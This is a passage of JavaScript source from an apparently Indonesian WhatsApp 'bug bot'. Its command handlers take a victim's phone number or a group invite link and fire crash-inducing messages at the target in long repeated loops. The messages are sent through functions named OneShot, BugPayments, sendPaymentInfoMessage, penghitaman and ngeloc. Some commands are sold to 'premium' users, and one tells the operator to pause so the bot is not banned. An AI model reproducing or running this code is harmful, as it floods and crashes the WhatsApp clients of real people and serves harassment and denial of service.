await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
reply(`_Yakin Ga C1 Wkwkk😂_`)
}
}
break
case 'hadzz_cipok': {
if (!isOwner) return reply(mess.only.owner)
if (!q) return reply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
reactemoji('☠️')
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
reply(`_Yakin Ga C1 Wwkwk 😂_`)
}
}
break
case 'svb_cuk': {
if (!isOwner) return reply(mess.only.owner)
if (!q) return reply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
reactemoji('☠️')
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
reply(`_Yakin Ga C1 Wkwkk😂_`)
}
}
break
case 'turu_dek': {
if (!isOwner) return reply(mess.only.owner)
if (!q) return reply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
reactemoji('☠️')
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
reply(`_Yakin Ga C1 Wkwkk😂_`)
}
}
break
break
case 'hev': {
if (!isOwner) return reply(mess.only.owner)
if (!q) return reply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
reactemoji('☠️')
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
reply(`_Yakin Ga C1 Wkwkk😂_`)
}
}
break
case 'bugvid1':
if (!isPremium) return reply(mess.only.premium)
bugvid1 = fs.readFileSync('./virtex/bug1.mp4')
BaraCybeer.sendMessage(m.chat, {video: bugvid1},{quoted: m})
break
case "jids-lol": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await BaraCybeer.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62xxxxxxxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-system": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await BaraCybeer.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62xxxxxxxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-toui": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await BaraCybeer.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62xxxxxxxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-external": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await BaraCybeer.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62xxxxxxxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-internal": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await BaraCybeer.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62xxxxxxxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-engine": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await BaraCybeer.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62xxxxxxxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "systemuicrash": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await BaraCybeer.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62xxxxxxxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "ui-grup": {
  
    if (!isPremium) return reply(mess.prem)
    if (!text) {
      return reply("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    reply("please wait, " + command + " bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return reply("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await BaraCybeer.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      reply("*DONEâœ… BUG HAS BEEN SENT TO THE GROUP!.*");
      BaraCybeer.groupLeave(groupTarget);
    } catch (error) {
      reply(util.format(error));
    }
  }
  break;
case 'barabug': case '⚡': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await reply('Sucessfull sent bug') 
}
break
case 'vip-crash': case '🗿': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
